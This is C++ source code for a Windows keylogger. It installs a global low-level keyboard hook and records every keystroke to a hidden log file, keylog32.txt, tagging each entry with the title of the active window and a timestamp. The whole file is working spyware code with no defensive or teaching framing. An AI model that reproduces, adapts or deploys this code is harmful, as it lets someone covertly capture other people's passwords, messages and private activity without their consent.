#include <Windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>
#include <chrono>
#include <ctime>

#include "data.h"

HHOOK hHook{ NULL };
HWND curForeground{ NULL };
FILE *f;

char* getWindowText(HWND hwnd)
{		
	DWORD dTextLength = GetWindowTextLength(hwnd);
	LPSTR buffer = (LPSTR)GlobalAlloc(GPTR, dTextLength);
	GetWindowTextA(hwnd, buffer, dTextLength + 1);
	return buffer;
}
//the cumbus caun
char* getTimeStamp()
{
	std::time_t curTime = std::time(nullptr);		
	return strtok(std::ctime(&curTime),"\n");
}

LRESULT CALLBACK keyboard_hook(const int code, const WPARAM wParam, const LPARAM lParam) {
	char LOG_FLAG = 1;

	if (curForeground != GetForegroundWindow())
	{
		char* windowTitle = "";
		char* timesStamp = "";

		curForeground = GetForegroundWindow();
		
		windowTitle = getWindowText(curForeground);
		timesStamp = getTimeStamp();

		if (strcmp(windowTitle, "Task Switching") != 0)
		{			
			fprintf(f,"\n--[%s|Time:%s]--\n", windowTitle,timesStamp);			
		}
		else if (strcmp(windowTitle, "Task Switching") == 0)
		{
			LOG_FLAG = 0;
		}				
	}
	
	if ((wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) && LOG_FLAG) {
		KBDLLHOOKSTRUCT *kbdStruct = (KBDLLHOOKSTRUCT*)lParam;
		DWORD key = kbdStruct->vkCode;		
		DWORD wScanCode = kbdStruct->scanCode;
		
		BYTE lpKeyState[256];
		GetKeyboardState(lpKeyState);
		
		unsigned int virtKey = (unsigned int)key;

		if (key ==	  VK_CONTROL
			|| key == VK_LCONTROL
			|| key == VK_RCONTROL
			|| key == VK_SHIFT
			|| key == VK_RSHIFT
			|| key == VK_LSHIFT
			|| key == VK_MENU
			|| key == VK_LMENU
			|| key == VK_RMENU
			|| key == VK_CAPITAL
			|| key == VK_NUMLOCK
			|| key == VK_LWIN
			|| key == VK_RWIN
			|| key == VK_PRIOR    // page up
			|| key == VK_NEXT    // page down
			|| key == VK_HOME
			|| key == VK_END
			|| key == VK_DELETE
			|| key == VK_PAUSE
			|| key == VK_SCROLL
			|| key == VK_PRINT
			|| key == VK_UP
			|| key == VK_DOWN
			|| key == VK_LEFT
			|| key == VK_RIGHT
			|| key == VK_ESCAPE
			|| key == VK_TAB
			|| key == VK_F1
			|| key == VK_F2
			|| key == VK_F3
			|| key == VK_F4
			|| key == VK_F5
			|| key == VK_F6
			|| key == VK_F7
			|| key == VK_F8
			|| key == VK_F9
			|| key == VK_F10
			|| key == VK_F11
			|| key == VK_F12
			)
		{
			fprintf(f,vkeys[virtKey]);
		}
		else
		{
			char result;
			ToAscii(key, wScanCode, lpKeyState, (LPWORD)&result, 0);

			if (key != VK_SHIFT && GetAsyncKeyState(VK_SHIFT) & 0x8000)
			{
				if ((shiftVirtKeys.find(key) == shiftVirtKeys.end()))
				{
					result = result ^ 32;
				}
				else {
					result = shiftValues[result];
				}
			}
			fprintf(f,"%c", result);			
		}
	}
	return CallNextHookEx(hHook, code, wParam, lParam);
}

void printDebugString(char* debugString) {
	char string[256];
	sprintf_s(string, "[ERROR_CODE=%d]:%s\n", GetLastError(), debugString);
	OutputDebugStringA(string);
}

char registerKeyboardHook()
{
	hHook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboard_hook, NULL, 0);

	if (hHook == NULL)
	{
		return 0;
	}

	return 1;
}

void unRegisterKeyboardHook()
{
	BOOL isSucessful = UnhookWindowsHookEx(hHook);
	hHook = NULL;
}

void onExit()
{
	fclose(f);
	unRegisterKeyboardHook();
}

int _tmain(int argc, _TCHAR* argv[])
{	
	if (registerKeyboardHook())
	{
		// TODO: handle this
	}
	else return 0;
	
	f = fopen("keylog32.txt", "a+");		
	atexit(onExit); 

	MSG msg = { 0 };
	BOOL msgRet;
	while (msgRet = GetMessage(&msg, NULL, 0, 0)) 
	{		
		TranslateMessage(&msg);
		DispatchMessage(&msg);		
	}
	return 0;
}

